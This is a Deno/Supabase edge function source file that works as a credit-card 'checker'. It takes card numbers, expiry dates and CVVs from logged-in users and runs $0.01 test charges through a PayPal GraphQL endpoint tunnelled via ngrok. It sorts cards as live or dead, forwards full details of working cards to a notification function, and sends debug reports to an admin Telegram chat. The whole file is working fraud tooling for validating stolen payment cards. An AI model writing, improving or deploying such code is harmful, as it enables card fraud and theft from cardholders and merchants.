import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_URL = "https://dierdre-unscoring-adalyn.ngrok-free.dev/api/paypal-graphql";

async function sendAdminDebug(card: string, rawResponse: string, status: string) {
  if (!TELEGRAM_BOT_TOKEN || status === "dead") return;

  const maskedCard = card.replace(/^(\d{6})(\d+)(\d{4})/, '$1****$3');
  const statusEmoji = status === "live" ? "✅" : "⚠️";
  const statusLabel = status === "live" ? "CHARGED" : "UNKNOWN";

  const message = `🔧 <b>[PAYPAL GRAPHQL DEBUG]</b> ${statusEmoji} ${statusLabel}

💳 Card: <code>${maskedCard}</code>
📡 Raw Response:
<code>${rawResponse.slice(0, 800)}</code>`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
  } catch (e) {
    console.error("[PAYPAL-GQL] Admin debug send error:", e);
  }
}

const getStatusFromResponse = (data: Record<string, unknown>): { status: "live" | "dead" | "unknown"; message: string } => {
  const msg = ((data?.message || data?.error || data?.result || "") as string);
  const statusField = ((data?.status || "") as string).toLowerCase();
  const success = data?.success;

  // Extract nested details
  let detailMsg = "";
  if (data?.details) {
    const details = data.details as any;
    if (Array.isArray(details)) {
      detailMsg = details.map((d: any) => d.description || d.issue || "").join("; ");
    } else if (details?.data?.errors?.errors) {
      const nestedErrors = details.data.errors.errors;
      const errorMessages: string[] = [];
      for (const key of Object.keys(nestedErrors)) {
        if (Array.isArray(nestedErrors[key])) errorMessages.push(...nestedErrors[key]);
      }
      if (errorMessages.length > 0) detailMsg = errorMessages.join("; ");
    } else if (details?.message) {
      detailMsg = details.message;
    }
  }

  const fullMsg = detailMsg || msg || "";
  const lowerMsg = fullMsg.toLowerCase();

  // LIVE
  if (success === true || statusField === "charged" || statusField === "approved" || statusField === "live" ||
      lowerMsg.includes("charged") || lowerMsg.includes("approved") || lowerMsg.includes("payment successful")) {
    return { status: "live", message: fullMsg || "Charged $0.01" };
  }

  // DEAD
  if (success === false && (statusField === "declined" || statusField === "failed" || statusField === "error")) {
    return { status: "dead", message: fullMsg || "Payment Failed" };
  }
  if (lowerMsg.includes("declined") || lowerMsg.includes("failed") || lowerMsg.includes("insufficient") ||
      lowerMsg.includes("expired") || lowerMsg.includes("incorrect") || lowerMsg.includes("do not honor") ||
      lowerMsg.includes("card number") || lowerMsg.includes("security code") || lowerMsg.includes("lost") ||
      lowerMsg.includes("stolen") || lowerMsg.includes("restricted") || lowerMsg.includes("pickup") ||
      lowerMsg.includes("payer_cannot_pay") || lowerMsg.includes("unprocessable")) {
    return { status: "dead", message: fullMsg || "Payment Failed" };
  }

  if (success === false) {
    return { status: "unknown", message: fullMsg || "Unknown response" };
  }

  if (fullMsg) {
    return { status: "unknown", message: fullMsg };
  }

  return { status: "unknown", message: "No response" };
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ error: 'No authorization header' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await createClient(
      SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY")!
    ).auth.getUser(token);

    if (authError || !user) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), {
        status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { data: profile } = await supabase
      .from('profiles').select('is_banned').eq('user_id', user.id).maybeSingle();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: 'Account is banned' }), {
        status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const { cc } = await req.json();
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Missing cc parameter' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const parts = cc.split('|');
    if (parts.length < 4) {
      return new Response(JSON.stringify({
        computedStatus: "unknown", apiStatus: "ERROR",
        apiMessage: "Invalid card format. Required: CardNumber|MM|YY|CVV",
      }), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const [cardNum, mm, yy, cvv] = parts;
    const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;

    console.log(`[PAYPAL-GQL] Checking card: ${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`);

    const url = `${API_URL}?cc=${encodeURIComponent(fullCard)}`;
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 60000);

    let responseText = "";
    let computedStatus: "live" | "dead" | "unknown" = "unknown";
    let apiMessage = "No response";

    try {
      const apiResponse = await fetch(url, { method: "GET", signal: controller.signal });
      clearTimeout(timeout);
      responseText = await apiResponse.text();
      console.log(`[PAYPAL-GQL] Raw response: ${responseText.slice(0, 500)}`);

      try {
        const jsonData = JSON.parse(responseText);
        const result = getStatusFromResponse(jsonData);
        computedStatus = result.status;
        apiMessage = result.message;
      } catch {
        const lower = responseText.toLowerCase().trim();
        if (lower.includes("charged") || lower.includes("approved") || lower.includes("success") || lower.includes("live")) {
          computedStatus = "live";
          apiMessage = responseText.trim() || "Charged $0.01";
        } else if (lower.includes("declined") || lower.includes("failed") || lower.includes("dead") ||
                   lower.includes("insufficient") || lower.includes("expired") || lower.includes("do not honor")) {
          computedStatus = "dead";
          apiMessage = responseText.trim() || "Payment Failed";
        } else if (lower.length > 0) {
          computedStatus = "unknown";
          apiMessage = responseText.trim();
        }
      }
    } catch (fetchError) {
      clearTimeout(timeout);
      console.error("[PAYPAL-GQL] Fetch error:", fetchError);
      apiMessage = fetchError instanceof Error ? fetchError.message : "Connection error";
    }

    // Notify for LIVE
    if (computedStatus === "live") {
      supabase.functions.invoke('notify-charged-card', {
        body: {
          user_id: user.id, card_details: fullCard, status: "CHARGED",
          response_message: apiMessage, amount: "$0.01", gateway: "PayPal GraphQL Charge",
          api_response: responseText.slice(0, 500),
        }
      }).catch(e => console.error("[PAYPAL-GQL] Notify error:", e));
    }

    sendAdminDebug(cardNum, responseText, computedStatus);

    const result = {
      computedStatus,
      apiStatus: computedStatus === "live" ? "CHARGED" : computedStatus === "dead" ? "DECLINED" : "UNKNOWN",
      apiMessage,
      apiTotal: "$0.01",
      rawResponse: responseText.slice(0, 1000),
    };

    console.log(`[PAYPAL-GQL] Result: ${result.computedStatus} - ${result.apiMessage}`);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('[PAYPAL-GQL] Error:', error);
    return new Response(JSON.stringify({
      computedStatus: "unknown", apiStatus: "ERROR",
      apiMessage: error instanceof Error ? error.message : "Unknown error",
      rawResponse: String(error),
    }), { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
